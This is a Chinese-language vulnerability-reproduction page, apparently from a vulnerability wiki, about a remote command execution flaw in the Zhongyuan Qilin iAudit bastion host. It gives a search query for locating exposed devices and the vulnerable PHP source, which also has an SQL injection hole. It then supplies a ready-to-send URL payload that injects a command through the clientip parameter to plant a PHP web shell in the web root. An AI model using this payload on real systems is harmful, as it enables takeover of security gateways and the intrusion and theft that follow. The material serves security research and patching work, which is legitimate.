---
title: "中远麒麟 iAudit堡垒机 get_luser_by_sshport.php 远程命令执行漏洞"
date: 2026-10-18 09:15:45
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "中远麒麟-iAudit堡垒机"
tags:
  - "中远麒麟-iAudit堡垒机"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

中远麒麟 iAudit堡垒机 get_luser_by_sshport.php文件存在命令拼接，攻击者通过漏洞可获取服务器权限

## 漏洞影响

```
中远麒麟 iAudit堡垒机
```

## 网络测绘

```
cert.subject="Baolei"
```

## 漏洞复现

登录页面如下

![image-20220525100240635](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205251002739.png)

出现漏洞的文件为 get_luser_by_sshport.php

```
<?php
define('CAN_RUN', 1);
require_once('include/global.func.php');
require_once('include/db_connect.inc.php');
if(empty($_GET['clientip'])){
	echo 'no host';
	return;
}
if(empty($_GET['clientport'])){
	echo 'no port';
	return;
}
$cmd = 'sudo perl test.pl '.$_GET['clientip'].' '.$_GET['clientport'];
exec($cmd, $o, $r);
 $sql = "SELECT luser FROM sessions WHERE addr='".$_GET['clientip']."' and pid='".$o[0]."' order by sid desc limit 1";
$rs = mysql_query($sql);
$row = mysql_fetch_array($rs);
echo $row['luser'];
?>
```

其中 clientip存在命令拼接 使用 ; 分割命令就可以执行任意命令

Web目录默认为 `/opt/freesvr/web/htdocs/freesvr/audit/`

发送Payload

```
https://xxx.xxx.xxx.xxx/get_luser_by_sshport.php?clientip=1;echo+%27%3C?php%20var_dump(shell_exec($_GET[cmd]));?%3E%27%3E/opt/freesvr/web/htdocs/freesvr/audit/test.php;&clientport=1
```

![image-20220525100301367](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205251003398.png)

再访问写入的文件执行命令

![image-20220525100311413](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205251003445.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F-iAudit%E5%A0%A1%E5%9E%92%E6%9C%BA-get_luser_by_sshport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
